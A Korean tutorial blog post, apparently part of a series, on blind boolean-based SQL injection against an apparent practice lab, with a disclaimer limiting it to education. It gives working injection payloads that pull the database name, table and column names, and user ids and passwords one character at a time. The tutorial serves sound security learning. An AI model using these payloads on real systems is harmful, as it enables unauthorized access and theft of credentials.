---
layout: single
title:  "SQL injection 데이터 추출(4)"
categories: SQL-injection
typora-root-url: ..\
author_profile: false

---

<br>

# <span style="background:#000000; color:#ffffff">1. SQL injection 데이터 추출(4)</span>

<br><span style='font-weight:bold; font-size:15px'> ※ 주의 사항 :</span>   

<span style='font-weight:bold; font-size:15px'>1. 교육 목적으로만 이용 해주세요.</span><br>
<span style='font-weight:bold; font-size:15px'>2. 무단 침입, 데이터 유출, 개인 정보 침해 등 불법적인 활동은 심각한 법적 결과를 초래할 수 있습니다.</span><br>
<span style='font-weight:bold; font-size:15px'>3.  개인적인 테스트 환경을 구축해서 실습하시길 바랍니다. </span>

<br>

## <span style="background:#696969; color:#ffffff">1.1 개요 </span>

<br>

SQL injection 데이터 추출 방식에는 3 가지 방식이 있습니다.

<br>

<span style='font-weight:bold; font-size:15px'>1. SQL 질의 문 결과가 화면에 출력 되는 경우(데이터추출(2)) => UNION SQLi (로그인 or 게시판 등)</span>

<span style='font-weight:bold; font-size:15px'>2. 에러 메세지가 화면에 출력 되는 경우(데이터추출(3)) => Error Based SQLi (에러 메세지 확인 가능 한 곳)</span>

<span style='font-weight:bold; font-size:15px'>3. 참과 거짓으로 출력 되는 경우 => Blind SQLi (로그인 or 아이디 중복 체크 등)</span>

   와 같은 방식으로 해결할 수 있습니다. 

<br>

이번 포스팅에서는 3 번을 배워보도록 합시다.

<br>

## <span style="background:#696969; color:#ffffff">1.2  Blind SQL injection<span style="font-size:50%">(참, 거짓 정도만 출력되는 경우)</span></span>

<br>

### <span style="background:#909090; color:#ffffff">1.2.1 개요</span>

***

<br>

<img src="/images/2024-06-01-SQLinjection16/image-20240601124800301.png" alt="image-20240601124800301" style="zoom:67%;" />

blind sqli 같은 경우는 sql 에러 마저 출력 되지 않고, 참 거짓 정도 밖에 알 수 없는 상태일 때 이용합니다.    
그래서 한 글자 한 글자가 맞는 지 틀린 지를 참 거짓의 정보를 통해 알아냅니다.

수작업을 하는 것이 굉장히 시간이 오래 걸리기 때문에, 정보가 충분하다면 사용하지 않습니다.  
또는 python 과 같은 다른 프로그램 언어를 통해 자동화를 만들기도 합니다.



<br>

### <span style="background:#909090; color:#ffffff">1.2.2 필요한 개념</span>

***

<br>

👉<span style='font-size:17px'> **`Substr()`**: 글자를 잘라주는 역할</span>

substr(글자, index 1부터 시작, 글자개수)

예)   
substr('test',1,1) ▶ 't'  
substr('test',2,1) ▶ 'e'  
substr('test',1,2) ▶ 'te'

<br>

👉<span style='font-size:17px'> **`ascii()`**: 글자를 숫자로 바꿔줌</span>

예)  
ascii('a')=97

![image-20240601121547715](/images/2024-06-01-SQLinjection16/image-20240601121547715.png)

둘 개념을 적용하여, ascii(substr(select~~),1,1)) 를 쓰게 되면 불러온 데이터의 한 글자가 숫자로 치환된다.

이를 출력하여 직접 볼 수 는 없고, 이 숫자를 updown으로 판별하여 한 글자를 알 수 있게 된다. 

예 )   
ascii(substr(select~~),1,1)) >0 이 참이면, 글자가 존재한다는 뜻이다. 거짓이면, 글자가 존재하지 않는다는 뜻이다.  

ascii(substr(select 'a'),1,1)) > 70 이 참이므로, 점차 숫자를 높여 나간다.    
ascii(substr(select 'a'),1,1)) = 97 

ascii(substr(select '!'),1,1)) < 70 이 참이므로, 점차 숫자를 낮춰 나간다.  
ascii(substr(select '!'),1,1)) = 33
<br>

### <span style="background:#909090; color:#ffffff">1.2.3 데이터 추출의 과정<span style="font-size:50%">(참, 거짓을 화면으로 볼 수 있을 때)</span></span>

***

<br><span style='font-weight:bold; font-size:20px'>〈 Blind 이용한 sql injection pocess 〉</span>

<br>

<span style='font-weight:bold; font-size:15px'>1. sql injection 포인트 찾기 (sql injection이 가능한지 확인하고, 어떤 로직으로 구성했을까? 예측하기)</span>

<span style='font-weight:bold; font-size:15px'>2. select 문구가 사용가능한 지 체크</span>

<span style='font-weight:bold; font-size:15px'>3. 공격 format 만들기</span>

<span style='font-weight:bold; font-size:15px'>4. DB이름 확인하기</span>

<span style='font-weight:bold; font-size:15px'>5. table이름 확인하기</span>

<span style='font-weight:bold; font-size:15px'>6. column 이름 확인하기</span>

<span style='font-weight:bold; font-size:15px'>7. data 추출하기</span>

   예제에 따라 해당 절차를 시행해보면서 설명해보겠습니다.

<br>

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.2.2.1 sql injection 포인트 찾기</span>

***

<br>

<img src="/images/2024-06-01-SQLinjection16/image-20240601125007358.png" alt="image-20240601125007358" style="zoom:67%;" />



SQL 구문을 사용할 수 있고, 참 거짓을 확인 할 수 있다

▶ Blind sqli 가능!

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.2.2.2  select 문구가 사용가능한 지 체크</span>

***

<br>

<img src="/images/2024-06-01-SQLinjection16/image-20240601125219643.png" alt="image-20240601125219643" style="zoom:67%;" />

<img src="/images/2024-06-01-SQLinjection16/image-20240601125237816.png" alt="image-20240601125237816" style="zoom:67%;" />

중간 and 문에도 참 거짓이 확인 됨
▶ Blind sqli 가능!

<img src="/images/2024-06-01-SQLinjection16/image-20240601125358300.png" alt="image-20240601125358300" style="zoom:67%;" />

<img src="/images/2024-06-01-SQLinjection16/image-20240601125648850.png" alt="image-20240601125648850" style="zoom:67%;" />

select문으로 바꿔서 작성해도 참 거짓 확인 됨

▶ Blind sqli 가능!

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.2.2.3 공격 format 만들기</span>

***

<br>

normaltic' and ascii(substr((select 'test'),1,1)>0) and '1'='1

<img src="/images/2024-06-01-SQLinjection16/image-20240601125950843.png" alt="image-20240601125950843" style="zoom:67%;" />



위의 구문 대로 라면 t가 나와야 한다. 그게 0보다 크므로 글자가 존재한다는 뜻이다.

<br>

따라서 

normaltic' and ascii(substr((<span style="font-weight:bold; color: orange">select~~~</span>),1,1)>0) and '1'='1

이와 같이 select 부분만 바꿔서 계속 쓸 수 있도록 공격 format을 만들 수 있습니다.

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.2.2.4 DB이름 확인하기</span>

***

<br>

DB 이름 확인하는 법은   
select database() 이므로,   
<br>

공격 format   
normaltic' and ascii(substr((<span style="font-weight:bold; color: orange">select~~~</span>),1,1)>0) and '1'='1  
에 대입한다.   
<br>

normaltic' and ascii(substr((<span style="font-weight:bold; color: orange">select database() limit 0,1</span>),1,1)>0) and '1'='1

찾을 때 burp suite을 이용하면 간편하다.....이 직접 찾는 것은 문제 풀이 포스팅에서 깊이 다루도록 하겠습니다.

<img src="/images/2024-06-01-SQLinjection16/image-20240601130937018.png" alt="image-20240601130937018" style="zoom:67%;" />

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.2.2.5 table이름 확인하기</span>

***

<br>

table 이름 확인하는 법은  
select table_name from information_schema.tables where table_schema='DB name' limit 0,1 이므로,   
<br>

공격 format   
normaltic' and ascii(substr((<span style="font-weight:bold; color: orange">select~~~</span>),1,1)>0) and '1'='1  
에 대입한다.   
<br>

normaltic' and ascii(substr((<span style="font-weight:bold; color: orange">select table_name from information_schema.tables where table_schema='segfault_sql' limit 0,1</span>),1,1)>0) and '1'='1

<br>

<img src="/images/2024-06-01-SQLinjection16/image-20240601131408387.png" alt="image-20240601131408387" style="zoom:67%;" />

#### <span style="background:#A9A9A9; color:#ffffff">1.2.2.6 column 이름 확인하기</span>

***

<br>

column 이름 확인하는 법은  
select column_name from information_schema.columns where table_name='table name' limit 0,1 이므로,   
<br>

공격 format   
normaltic' and ascii(substr((<span style="font-weight:bold; color: orange">select~~~</span>),1,1)>0) and '1'='1  
에 대입한다.   
<br>

normaltic' and ascii(substr((<span style="font-weight:bold; color: orange">select column_name from information_schema.columns where table_name='member' limit 0,1</span>),1,1)>0) and '1'='1



<br>

<img src="/images/2024-06-01-SQLinjection16/image-20240601131555791.png" alt="image-20240601131555791" style="zoom:67%;" />



#### <span style="background:#A9A9A9; color:#ffffff">1.2.2.7 data 추출하기</span>

***

<br>

normaltic' and ascii(substr((<span style="font-weight:bold; color: orange">select id from member limit 0,1</span>),1,1)>0) and '1'='1

normaltic' and ascii(substr((<span style="font-weight:bold; color: orange">select pass from member limit 0,1</span>),1,1)>0) and '1'='1

<br>

<img src="/images/2024-06-01-SQLinjection16/image-20240601135825807.png" alt="image-20240601135825807" style="zoom:67%;" />

ascii에서 d 가 100인데, 여기서 첫 글자는 d 입니다.   이렇게 id 와 password를 구하다 보면 

error based sqli 과 마찬가지로 데이터 결과는 같습니다. 